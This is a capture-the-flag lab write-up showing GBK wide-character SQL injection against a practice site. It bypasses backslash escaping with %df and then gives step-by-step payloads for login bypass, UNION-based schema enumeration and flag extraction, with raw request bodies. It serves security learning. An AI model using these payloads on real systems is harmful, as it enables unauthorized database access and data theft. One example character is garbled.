# Lab 6.3.3 SQL Wide-Char-Based Injection

## 0x00 Basic Knowledge

Lots of non-English countries are using different charset besides unicode (utf-8). For example, in China, gbk is still very popular among some CMS or sites. 

However, different charset may need different number of bytes to store them.

- utf8 3 bytes
- gbk 2 bytes

### Issue Causes

So when some sites using different charsets for backend and database, for example PHP (utf-8) and MySQL (gbk), some vulnerabilities may occur for wide char injection.

```sql
SET NAMES 'gbk'
```

which inculdes the following

```sql
SET character_set_client = gbk;
SET character_set_results = gbk;
SET character_set_connection = gbk;
```

### magic_quotes_gpc

When magic_quotes_gpc is ON, it may add "\" in front of most of the special characters

- '
- "
- \
- NULL

for all POST, GET, COOKIE etc input variables.

### Injection

In order to bypass additional \, we need to inject more payload to remove that backslash.

In gbk, \ is represent as %5c and 'ÈÅã' is %df%5c, we can add addition %df to eliminate the backslash.

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### [Home Page][2]

![](./imgs/0_home.jpg)

### Injection Point

Try type the following into username input.

```sql
1'#
```

![](./imgs/1_first_try.jpg)

Have first try, a backslash was added automatically infront of the qutation mark, will need to try wide-char to eliminate it.

### Add Bytes

```sql
1%df'#
```

![](./imgs/2_df.jpg)

The result shows %df directly on page, % may also be converted to soimething else.

Tried again with Burp, and got the following payload.

```sql
uname=1%25df%27%23&passwd=&submit=Submit
```

% is converted to %25. Should make some changes.

```sql
uname=1%df%27%23&passwd=&submit=Submit
```

![](./imgs/2_eliminate.jpg)

Successfully add the prefix.

### Try Login

```sql
1%df' OR 1=1#
```

```sql
uname=1%df%27+OR+1%3D1%23&passwd=&submit=Submit
```

![](./imgs/3_login.jpg)

### Field Number

```sql
1%df' ORDER BY 1,2#
```

```sql
uname=1%df%27+ORDER+BY+1%2C2%23&passwd=&submit=Submit
```

![](./imgs/4_col_num.jpg)

When reaching 3, error occurs. So should have 2 columns.

### Display Location

```sql
1%df' UNION SELECT 1,2#
```

```sql
uname=1%df%27+UNION+SELECT+1%2C2%23&passwd=&submit=Submit
```

![](./imgs/5_display.jpg)

### TABLE_NAME

```sql
1%df' UNION SELECT 1,GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()#
```

```sql
uname=1%df%27+UNION+SELECT+1%2CGROUP_CONCAT%28TABLE_NAME%29+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3DDATABASE%28%29%23&passwd=&submit=Submit
```

![](./imgs/6_table_name.jpg)

| OFFSET | TABLE_NAME   |
| ------ | ------------ |
| 0      | emails       |
| 1      | referers     |
| 2      | uagents      |
| 3      | users        |
| 4      | zkaq         |

### CLOUMN_NAME

Use in [HEX][3] version TABLE_NAME directly.

```sql
1%df' UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7a6b6171#
```

```sql
uname=1%df%27+UNION+SELECT+1%2CGROUP_CONCAT%28COLUMN_NAME%29+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME%3D0x7a6b6171%23&passwd=&submit=Submit
```

![](./imgs/7_column_name.jpg)

| OFFSET | COLUMN_NAME  |
| ------ | ------------ |
| 0      | flag         |
| 1      | zKaQ         |

### FLAG

```sql
1%df' UNION SELECT 1,zKaQ FROM zkaq WHERE flag=9#
```

```sql
uname=1%df%27+UNION+SELECT+1%2CzKaQ+FROM+zkaq+WHERE+flag%3D9%23&passwd=&submit=Submit
```

![](./imgs/8_flag.jpg)

**FLAG** = **zKaQ-Slash4sSQl**

[1]: https://hack.zkaq.org/?a=battle&f=target&id=ac831dc9dde0bd84
[2]: http://120.203.13.75:8150/New/WidecharBased/RankThree/sql-three/
[3]: https://codebeautify.org/string-hex-converter